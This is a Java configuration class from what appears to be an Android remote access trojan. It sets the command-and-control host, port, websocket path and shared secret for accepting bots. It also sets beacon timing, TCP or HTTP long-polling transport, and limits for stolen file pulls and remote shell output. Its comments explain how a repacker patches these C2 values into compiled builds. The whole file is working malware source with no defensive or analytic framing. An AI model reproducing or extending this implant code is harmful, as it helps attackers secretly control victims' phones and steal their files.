package com.darkbiit.rat;

/**
 * Runtime configuration for the RAT payload.
 *
 * IMPORTANT: the fields are deliberately NOT `final`. A `static final String`
 * with a literal initializer is inlined into every call site at compile time,
 * so the repacker could not rewrite it by patching the class file. Non-final
 * statics are assigned in <clinit> via const-string / const, and the repacker
 * rewrites exactly those instructions by matching the field they feed.
 *
 * The repacker (repacker/repack.py) rewrites:
 *   const-string -> C2_HOST, C2_PATH, SECRET, TAG
 *   const        -> BEACON_INTERVAL_MS, CONNECT_TIMEOUT_MS
 *   const/4      -> USE_WSS
 */
public final class RatCfg {

    private RatCfg() {
    }

    /** C2 host, e.g. "10.0.2.2" or "rat.example.com". */
    public static String C2_HOST = "127.0.0.1";

    /** C2 port. */
    public static int C2_PORT = 8777;

    /** C2 websocket path. */
    public static String C2_PATH = "/ws";

    /** Shared secret, checked by the server before accepting a bot. */
    public static String SECRET = "changeme";

    /** Log tag used in logcat. */
    public static String TAG = "rat";

    /** Beacon / reconnect interval in milliseconds. */
    public static int BEACON_INTERVAL_MS = 15000;

    /** TCP connect timeout in milliseconds. */
    public static int CONNECT_TIMEOUT_MS = 10000;

    /** Use wss:// instead of ws:// (TLS). */
    public static boolean USE_WSS = false;

    /**
     * Transport used to reach the C2.
     *
     * "tcp"  a raw socket (the default; the server owns the port)
     * "http" HTTP long polling, for shared hosting where no raw port can be
     *        bound and the bots must go through an HTTP reverse proxy
     *
     * When "http" is used, C2_HOST must be the full base URL of the panel,
     * for example "https://rat.example.com" or "http://127.0.0.1:8080".
     */
    public static String TRANSPORT = "tcp";

    /** Name of the state directory inside the app private files dir. */
    public static String STATE_DIR = "rat";

    /** Max payload size (bytes) accepted for a single file pull. */
    public static int MAX_PULL_BYTES = 8 * 1024 * 1024;

    /** Max number of shell output bytes returned to the panel. */
    public static int MAX_SHELL_OUTPUT = 256 * 1024;
}
